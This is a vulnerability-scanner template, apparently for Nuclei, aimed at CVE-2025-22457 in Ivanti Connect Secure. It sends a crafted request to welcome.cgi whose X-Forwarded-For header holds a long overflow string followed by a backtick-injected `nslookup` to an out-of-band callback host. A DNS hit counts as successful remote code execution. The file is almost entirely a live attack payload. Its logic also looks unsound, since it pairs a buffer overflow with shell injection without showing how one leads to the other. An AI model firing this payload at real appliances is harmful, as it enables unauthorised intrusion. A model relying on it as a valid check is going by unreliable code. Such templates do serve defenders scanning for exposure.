id: CVE-2025-22457

info:
  name: Ivanti Connect Secure - X-Forwarded-For Buffer Overflow/RCE
  author: kali
  severity: critical
  description: Stack-based buffer overflow in X-Forwarded-For header processing leading to RCE
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-22457
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/ivanti_connect_secure_stack_overflow_rce_cve_2025_22457.rb
  classification:
    cvss-score: 9.8
    cve-id: CVE-2025-22457
    cwe-id: CWE-121
  metadata:
    vendor: ivanti
    product: connect_secure
  tags: cve,cve2025,ivanti,rce,exploit

variables:
  overflow: "1.1.1.1,2.2.2.2,3.3.3.3,4.4.4.4,5.5.5.5,6.6.6.6,7.7.7.7,8.8.8.8,9.9.9.9,10.10.10.10,11.11.11.11,12.12.12.12,13.13.13.13,14.14.14.14,15.15.15.15,16.16.16.16,17.17.17.17,18.18.18.18,19.19.19.19,20.20.20.20,21.21.21.21,22.22.22.22,23.23.23.23,24.24.24.24,25.25.25.25,26.26.26.26,27.27.27.27,28.28.28.28,29.29.29.29,30.30.30.30,31.31.31.31,32.32.32.32,33.33.33.33,34.34.34.34,35.35.35.35,36.36.36.36,37.37.37.37,38.38.38.38,39.39.39.39,40.40.40.40,41.41.41.41,42.42.42.42,43.43.43.43,44.44.44.44,45.45.45.45,46.46.46.46,47.47.47.47,48.48.48.48,49.49.49.49,50.50.50.50,51.51.51.51,52.52.52.52,53.53.53.53,54.54.54.54,55.55.55.55,56.56.56.56,57.57.57.57,58.58.58.58,59.59.59.59,60.60.60.60,61.61.61.61,62.62.62.62,63.63.63.63,64.64.64.64,65.65.65.65,66.66.66.66,67.67.67.67,68.68.68.68,69.69.69.69,70.70.70.70,71.71.71.71,72.72.72.72,73.73.73.73,74.74.74.74,75.75.75.75,76.76.76.76,77.77.77.77"

http:
  - raw:
      - |
        GET /dana-na/auth/url_default/welcome.cgi HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{rand_text_alpha(8)}}
        Accept: text/html,application/xhtml+xml
        Connection: close
        X-Forwarded-For: {{overflow}},`nslookup {{interactsh-url}}`

    matchers:
      - type: dsl
        name: exploited
        dsl:
          - 'interactsh_protocol == "dns"'
